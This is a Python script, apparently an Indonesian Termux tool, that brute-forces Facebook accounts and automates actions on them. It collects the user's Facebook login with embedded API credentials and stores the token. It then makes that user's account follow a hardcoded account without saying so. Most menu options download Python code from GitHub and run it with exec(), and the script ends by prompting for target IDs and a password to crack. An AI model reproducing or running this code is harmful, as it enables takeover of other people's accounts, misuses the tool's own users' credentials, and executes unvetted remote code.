#!usr/bin/python3.7
#Author: MrAchmad
#bodo kau kalo recode
try:
	from multiprocessing.pool import ThreadPool
	from crayons import *
	from src import DOS
	from getpass import getpass
	import os, requests, sys, json, time, hashlib, random, shutil
except Exception as F:
	exit("[ModuleErr] %s"%(F))

if sys.version[0] in '2':
	exit("[sorry] use python version 3")

#remove cache
try:
	shutil.rmtree("src/__pycache__")
except: pass

#text warna

abu = "\033[1;30;40m" #abu abu
merah = "\033[1;31;40m" #merah
hijau = "\033[1;32;40m" #hijau
kuning = "\033[1;33;40m" #kuning
biru = "\033[1;34;40m" #biru
pink = "\033[1;35;40m" #pink
birumuda = "\033[1;36;40m" #birumuda
putih = "\033[1;37;40m" #putih

#banner
def banner(): 
	print(cyan('                  ',bold=True))
	print(cyan('                  ',bold=True))
	print(green('_________________________[ Selamat datang ]_________________________',bold=True))
	print(cyan('                  ',bold=True))
	print(white('                *                                [ Tool - Facebook ]',bold=True))
	print(white('               ( ) > Termux',bold=True))
	print(white('              (   )                    ',bold=True),red('????????????????????????????',bold=True))
	print(white('             (     )                   ',bold=True),red('??',bold=True),yellow('Author : Mr.Achmad',bold=True),green('    ??',bold=True))
	print(white('           _(       )_                 ',bold=True),red('??',bold=True),yellow('Contact : 085608035292',bold=True),green('??',bold=True))
	print(white('          [ INDONESIA ]                ',bold=True),green('????????????????????????????',bold=True))
	print(green('____________________________________________________________________',bold=True))
	
try:
	toket=open('toket/token.txt')
	toket.close()
except IOError:
		try:
			DOS.Dos()

			banner()
			try:
				os.mkdir('toket')
			except OSError: pass
			print(hijau+'\n login to your facebook account first');id = input('   [] Username : ');pwd = getpass('   [] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
			x = hashlib.new('md5')
			x.update(sig)
			data.update({'sig':x.hexdigest()})
			requ=requests.get('https://api.facebook.com/restserver.php',params=data)
			res=requ.json()['access_token']
			o=open('toket/token.txt','w')
			o.write(res)
			print("[!] success generate access token")
			print("[!] access token saved: toket/token.txt")
			folme=open('toket/token.txt','r').read();requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+folme)
			time.sleep(3)
			o.close()
		except KeyError:
			print("[!] failed generate access token")
			print("[!] Check your username/password")
			exit()
		except (KeyboardInterrupt,EOFError):
			exit("\n[!] Key interrupt: exit.")
		except Exception as F:
			exit("[Error] %s"%(F))

def rmtoken():
	print("""
	[ REMOVE TOKEN ]

1. remove access token
""")
	pilihan=int(input("[#] Pilih/> "))
	if pilihan == 1:
		ques=input("\n[?] are you sure (y/n) ")
		if ques == 'n' or ques == 'N':
			exit("[!] Canceling")
		elif ques == 'y' or ques == 'Y':
			os.remove('toket/token.txt')
			exit("[!] success removed access token")
		else: exit("[!] wrong input: exit")
	elif pilihan == 2:
		ques=input("\n[?] are you sure (y/n) ")
		if ques == 'n' or ques == 'N':
			exit("[!] Canceling")
		elif ques == 'y' or ques == 'Y':
			try:
				os.remove('toket/kue.txt')
			except FileNotFoundError: exit("[?] cookies not found")
			exit("[!] success removed cookies")
		else: exit("[!] wrong input: exit")
	elif pilihan == 3:
		ques=input("\n[?] are you sure (y/n) ")
		if ques == 'n' or ques == 'N':
			exit("[!] Canceling")
		elif ques == 'y' or ques == 'Y':
			os.remove('toket/token.txt')
			os.remove('toket/kue.txt')
			exit("[!] success removed access token & cookies")
		else: exit("[!] wrong input: exit")
	else: exit("[exit] wrong input")

def update():
	bd=input('[!?] Backup important folder (like: result, checker, and toket) (y/n) ')
	if bd == 'y' or bd == 'Y':
		import src.Backdir
	print("[!] updating...")
	if os.name in ['nt','win32']:
		os.system('cd .. & rd /s/q s-mbf')
		os.system('cd .. & git clone https://github.com/KANG-NEWBIE/s-mbf')
		exit()	
	else:
		os.system('cd ..;rm -rf s-mbf')
		os.system('cd ..;git clone https://github.com/KANG-NEWBIE/s-mbf')
		exit()

DOS.Dos()
banner()
try:
	toket=open('toket/token.txt','r').read()
	nam=requests.get('https://graph.facebook.com/me/?access_token='+toket)
	name=nam.json()['name']

	upver='v.2.2'
	requp=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
	if upver in str(requp):
		print(yellow('\nNew version available. update your s-mbf now!'))
except KeyError:
	print("\n[Warning] access token invalid. type '7' to remove access token")
except requests.exceptions.RequestException:
	exit("\n[Err] Check your internet connection")
try:
	print(white('\t                           '))
	print("""
   > 1. Hack facebook multi bruteforce
   > 2. Accept all friends requests
   > 3. Auto unfriends
   > 4. Deleted post
   > 5. Check app
   > 6. Delete all messages
   > 7. Remove access token
   > 0. Check update""")
except (KeyError,NameError): pass

pilih=int(input('\n[#] Pilih/> '))
DOS.Dos()
if pilih == 1:
	os.system('python2 Wertyu.py')
	exec(requests.get("https://raw.githubusercontent.com/xWR4217/codkk/master/data/Wertyu.py").text)
elif pilih == 2:
	exec(requests.get("https://raw.githubusercontent.com/xWR4217/codkk/master/data/Accept.py").text)
	exit
elif pilih == 3:
	exec(requests.get("https://raw.githubusercontent.com/xWR4217/codkk/master/data/Autoun.py").text)
	exit()
elif pilih == 4:
	exec(requests.get("https://raw.githubusercontent.com/xWR4217/codkk/master/data/post.py").text)
	exit()
elif pilih == 5:
	exec(requests.get("https://raw.githubusercontent.com/xWR4217/codkk/master/data/Chec.py").text)
elif pilih == 6:
	exec(requests.get("https://raw.githubusercontent.com/xWR4217/codkk/master/data/messages.py").text)
elif pilih == 7:
	rmtoken()
elif pilih == 0:
	print("\n[!] Checking update")
	rr=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
	if upver in str(rr):
		update()
	else: exit("[!] already up to date")
else:
	banner()

try:
        file=open(input("\n[in] Id List Target: ")).read().splitlines()
        pas=input("[in] Password to Crack: ")
except (KeyboardInterrupt,EOFError):
        exit(red("\n[!] Key interrupt: Exiting."))
except FileNotFoundError:
        exit(red("\n[!] File not found: Exiting."))
